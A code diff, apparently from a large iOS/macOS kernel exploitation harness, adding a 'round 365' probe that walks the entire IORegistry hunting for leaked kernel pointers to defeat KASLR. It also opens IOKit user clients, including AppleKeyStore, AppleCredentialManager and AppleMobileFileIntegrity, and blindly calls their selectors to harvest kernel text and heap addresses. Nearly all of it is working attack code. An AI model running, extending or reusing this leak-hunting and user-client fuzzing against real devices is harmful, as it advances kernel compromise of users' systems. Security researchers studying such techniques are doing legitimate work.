@@ -15699,6 +15699,208 @@ r359_done:
     fflush(stdout);
 }
 
+/* r362: Deep IORegistry property scan for kernel pointer leaks.
+ * Walk the entire IORegistry tree, deserialize all properties of every entry,
+ * and scan CFNumber values for kernel-range addresses.
+ */
+static void r362_probe(void) {
+    rlog("\n=== r362: Deep IORegistry Property Scan for KASLR Leak ===\n\n");
+    fflush(stdout);
+
+    int total_entries = 0, total_props = 0, kptr_hits = 0;
+
+    static const uint64_t skip_const362[] = {
+        0xFFFFFFF007004000ULL, 0xFFFFFFF007000000ULL, 0xFFFFFFF027004000ULL,
+        0xFFFFFFF037004000ULL, 0xFFFFFFF047004000ULL, 0xFFFFFFF017004000ULL,
+        0xFFFFFFF00F004000ULL, 0xFFFFFFF000000000ULL, 0xFFFFFFF800000000ULL,
+        0xFFFFFFFF00000000ULL, 0xFFFFFFFF00000001ULL, 0xFFFFFFFF00000002ULL,
+    };
+    int n_skip = (int)(sizeof(skip_const362)/sizeof(skip_const362[0]));
+
+    /* Recursive function to scan an entry and its children */
+    /* Use iterative approach with IORegistryIterator */
+    io_iterator_t iter = 0;
+    kern_return_t kr = IORegistryCreateIterator(kIOMasterPortDefault,
+        kIOServicePlane, kIORegistryIterateRecursively, &iter);
+    if (kr != KERN_SUCCESS || !iter) {
+        rlog("  ERROR: IORegistryCreateIterator failed: 0x%x\n", kr);
+        return;
+    }
+
+    io_object_t entry;
+    while ((entry = IOIteratorNext(iter)) != 0) {
+        total_entries++;
+
+        /* Get the entry name for context */
+        io_name_t name;
+        IORegistryEntryGetName(entry, name);
+
+        /* Get all properties */
+        CFMutableDictionaryRef props = NULL;
+        kr = IORegistryEntryCreateCFProperties(entry, &props, kCFAllocatorDefault, 0);
+        if (kr != KERN_SUCCESS || !props) {
+            IOObjectRelease(entry);
+            continue;
+        }
+
+        /* Iterate all keys and check numeric values */
+        CFIndex count = CFDictionaryGetCount(props);
+        if (count > 0 && count < 500) {
+            const void **keys = (const void**)malloc(sizeof(void*) * (size_t)count);
+            const void **vals = (const void**)malloc(sizeof(void*) * (size_t)count);
+            CFDictionaryGetKeysAndValues(props, keys, vals);
+
+            for (CFIndex i = 0; i < count; i++) {
+                total_props++;
+                CFTypeID tid = CFGetTypeID(vals[i]);
+
+                /* Check CFNumber for kernel addresses */
+                if (tid == CFNumberGetTypeID()) {
+                    int64_t numval = 0;
+                    if (CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &numval)) {
+                        uint64_t v = (uint64_t)numval;
+                        if (v >= 0xFFFFFFF000000000ULL && v < 0xFFFFFFFF00000000ULL) {
+                            int is_const = 0;
+                            for (int k = 0; k < n_skip; k++)
+                                if (v == skip_const362[k]) { is_const = 1; break; }
+                            if (!is_const) {
+                                char keybuf[128] = {0};
+                                if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                                    CFStringGetCString((CFStringRef)keys[i], keybuf, 128, kCFStringEncodingASCII);
+                                if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                                    rlog("  *** TEXT PTR: %s.%s = 0x%llx (off=+0x%llx) ***\n",
+                                        name, keybuf, (unsigned long long)v,
+                                        (unsigned long long)(v - 0xFFFFFFF007004000ULL));
+                                } else {
+                                    rlog("  KPTR: %s.%s = 0x%llx\n", name, keybuf, (unsigned long long)v);
+                                }
+                                kptr_hits++;
+                            }
+                        }
+                    }
+                }
+                /* Check CFData for embedded kernel pointers */
+                else if (tid == CFDataGetTypeID()) {
+                    CFDataRef data = (CFDataRef)vals[i];
+                    CFIndex len = CFDataGetLength(data);
+                    if (len >= 8 && len <= 65536) {
+                        const uint8_t *bytes = CFDataGetBytePtr(data);
+                        for (CFIndex j = 0; j + 7 < len; j += 8) {
+                            uint64_t v;
+                            memcpy(&v, bytes + j, 8);
+                            if (v >= 0xFFFFFFF000000000ULL && v < 0xFFFFFFFF00000000ULL) {
+                                int is_const = 0;
+                                for (int k = 0; k < n_skip; k++)
+                                    if (v == skip_const362[k]) { is_const = 1; break; }
+                                if (!is_const) {
+                                    char keybuf[128] = {0};
+                                    if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                                        CFStringGetCString((CFStringRef)keys[i], keybuf, 128, kCFStringEncodingASCII);
+                                    if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                                        rlog("  *** TEXT PTR (data): %s.%s[%d] = 0x%llx ***\n",
+                                            name, keybuf, (int)j, (unsigned long long)v);
+                                    } else {
+                                        rlog("  KPTR (data): %s.%s[%d] = 0x%llx\n",
+                                            name, keybuf, (int)j, (unsigned long long)v);
+                                    }
+                                    kptr_hits++;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            free(keys);
+            free(vals);
+        }
+        CFRelease(props);
+        IOObjectRelease(entry);
+    }
+    IOObjectRelease(iter);
+
+    rlog("\n  Scanned %d entries, %d properties, found %d kernel pointers\n",
+        total_entries, total_props, kptr_hits);
+
+    /* ---- Part 2: IOKit user client property scan ---- */
+    rlog("\n--- Part 2: IOKit user client output struct scan ---\n");
+    fflush(stdout);
+
+    /* Try to open various services and read their output structs */
+    const char *services[] = {
+        "IOSurfaceRoot", "IOGPU", "AGXAccelerator", "AGXFamilyAccelerator",
+        "AppleARMIODevice", "IOHIDSystem", "AppleSPU",
+        "AppleKeyStore", "AppleMobileFileIntegrity", "IOUserEthernet",
+        "AppleCredentialManager", "AppleEffaceableStorage",
+        "IOAudioEngine", "IOBluetoothHCIController",
+        NULL
+    };
+
+    int svc_hits = 0;
+    for (int s = 0; services[s]; s++) {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching(services[s]));
+        if (!svc) continue;
+
+        io_connect_t conn = 0;
+        kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        IOObjectRelease(svc);
+        if (kr != KERN_SUCCESS || !conn) continue;
+
+        /* Try getProperty on the connection for state/diagnostic data */
+        for (uint32_t sel = 0; sel < 16; sel++) {
+            uint64_t out[32];
+            uint32_t out_cnt = 32;
+            kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &out_cnt);
+            if (kr == KERN_SUCCESS && out_cnt > 0) {
+                for (uint32_t i = 0; i < out_cnt; i++) {
+                    uint64_t v = out[i];
+                    if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                        int is_const = 0;
+                        for (int k = 0; k < n_skip; k++)
+                            if (v == skip_const362[k]) { is_const = 1; break; }
+                        if (!is_const) {
+                            rlog("  *** TEXT PTR: %s sel=%u out[%u] = 0x%llx ***\n",
+                                services[s], sel, i, (unsigned long long)v);
+                            svc_hits++;
+                        }
+                    }
+                    if (v >= 0xFFFFFFFE00000000ULL && v < 0xFFFFFFFF00000000ULL) {
+                        rlog("  HEAP: %s sel=%u out[%u] = 0x%llx\n",
+                            services[s], sel, i, (unsigned long long)v);
+                        svc_hits++;
+                    }
+                }
+            }
+
+            /* Also try struct output */
+            uint8_t struct_out[4096];
+            size_t struct_sz = sizeof(struct_out);
+            kr = IOConnectCallStructMethod(conn, sel, NULL, 0, struct_out, &struct_sz);
+            if (kr == KERN_SUCCESS && struct_sz >= 8) {
+                for (size_t i = 0; i + 7 < struct_sz; i += 8) {
+                    uint64_t v;
+                    memcpy(&v, struct_out + i, 8);
+                    if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                        int is_const = 0;
+                        for (int k = 0; k < n_skip; k++)
+                            if (v == skip_const362[k]) { is_const = 1; break; }
+                        if (!is_const) {
+                            rlog("  *** TEXT PTR (struct): %s sel=%u off=%zu = 0x%llx ***\n",
+                                services[s], sel, i, (unsigned long long)v);
+                            svc_hits++;
+                        }
+                    }
+                }
+            }
+        }
+        IOServiceClose(conn);
+    }
+
+    rlog("  User client scan: %d hits\n", svc_hits);
+    rlog("\n=== r362 complete ===\n");
+    fflush(stdout);
+}
+
 /* r361: IOSurface-backed Metal texture KASLR leak
  * Theory: creating textures from IOSurfaces forces the GPU driver to store
  * IOSurface kext object pointers (including vtable addresses in slid kernel
@@ -54061,6 +54263,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 365) {
+            rlog("*** rounds=365: Deep IORegistry + IOKit User Client Scan ***\n");
+            rlog("  Walking entire IORegistry tree + scanning user client outputs\n");
+            rlog("  for accidentally leaked kernel text/heap pointers.\n\n");
+            fflush(stdout);
+            r362_probe();
+            goto done;
+        }
         if (rounds == 364) {
             rlog("*** rounds=364: IOSurface-backed Metal Texture KASLR Leak ***\n");
             rlog("  Creating IOSurface-backed textures, triggering GPU ops,\n");
@@ -56185,7 +56395,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -66027,7 +66237,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
